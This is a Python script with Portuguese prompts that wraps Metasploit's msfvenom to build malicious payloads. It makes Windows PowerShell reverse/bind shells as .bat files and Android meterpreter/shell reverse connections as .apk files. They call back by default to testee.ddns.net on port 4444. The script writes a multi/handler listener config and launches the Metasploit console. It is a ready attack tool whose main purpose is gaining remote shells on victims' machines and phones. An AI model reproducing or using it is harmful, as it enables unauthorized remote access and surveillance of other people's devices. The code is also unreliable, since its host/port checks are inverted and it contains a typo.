import os

print('''
 
      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .
 
 ''')
print("Se o HOST  ficar nulo sera padrão testee.ddns.net")
LHOST = input ('HOST: ')

if (LHOST !=  ' '):
     LHOST = 'testee.ddns.net'

print("se a PORT não for setada sera definida como 4444")        

LPORT = input('PORT: ')

if (LPORT != ' '):
    LPORT = 4444

print()
safe = input('Nome da carga util: ')
if (safe == ' '):
     safe = "PAYLOAD"

print("Selecione o payload\n")

print  ('''
1 ~~> cmd/windows/powershell_reverse_tcp
2 ~~> cmd/windows/powershell_bind_tcp
3 ~~> android/meterpreter/reverse_tcp
4 ~~> android/shell/reverse_tcp
  \n''')

'''
um = ("cmd/windows/powershell_reverse_tcp")
dois = ()
tres = ()
quatro = ()
'''
ser = input("selecione o tipo de carga util:" )

#_________________________________________________________________________________

if   ser == "1":
     print('Gerando...{>1<}')
     os.system('msfvenom.bat -p cmd/windows/powershell_reverse_tcp   LHOST={}  LPORT={}  -o {}.bat'.format(LHOST, LPORT, safe))
     arq = open('Opcoes de setagem.txt', 'w')
     arq.write("use multi/handler\nset PAYLOAD cmd/windows/powershell_reverse_tcp\nset LHOST {}\nset LPORT {}\nrun".format(LHOST, LPORT))
     arq.close()
  
if ser == '2':
     print('Gerando...{>2<}')
     os.system('msfvenom.bat  -p cmd/windows/powershell_bind_tcp   RHOST={}  LPORT={}  -o {}.bat'.format(LHOST, LPORT, safe))
     arq = open('Opcoes de setagem.txt', 'w')
     arq.write("use multi/handler\nset PAYLOAD cmd/windows/powershell_bind_tcp\nset LHOST {}\nset LPORT {}\nrun".format(LHOST, LPORT))
     arq.close()

if ser == '3':
      print("Gerando...{>3<}")
      os.system('msfvenom.bat -p android/meterpreter/reverse_tcp LHOST={} LPORT={} -o {}.apk'.format(LHOST, LPORT, safe))
      arq = open('Opcoes de setagem.txt', 'w')
      arq.write("use multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST {}\nset LPORT {}\nrun".format(LHOST, LPORT))
      arq.close()

if ser == '4':
     print("Gerando...{>4<}")
     os.system('msfvenom.bat -p android/shell/reverse_tcp LHOST={} LPORT={} -o {}.apk'.format(LHOST, LPORT, safe))

#____________________________________________________________________________________
else:
     print('POR FAVOR SELECIONE A OPÇAO VIAVEL')
#___________________________________________________________________________________              
'''
arq = open('Opcoes de setagem.txt','w')
arq.write("use multi/handler\nset PAYLOAD set LHOST {}\nset LPORT {}\nrun".format(LHOST, LPORT))
arq.close()
'''

#_______________________________________________________________________________________

print("Gerado...Abrindo o Msfconsole\n")
os.system("masfconsole.bat")
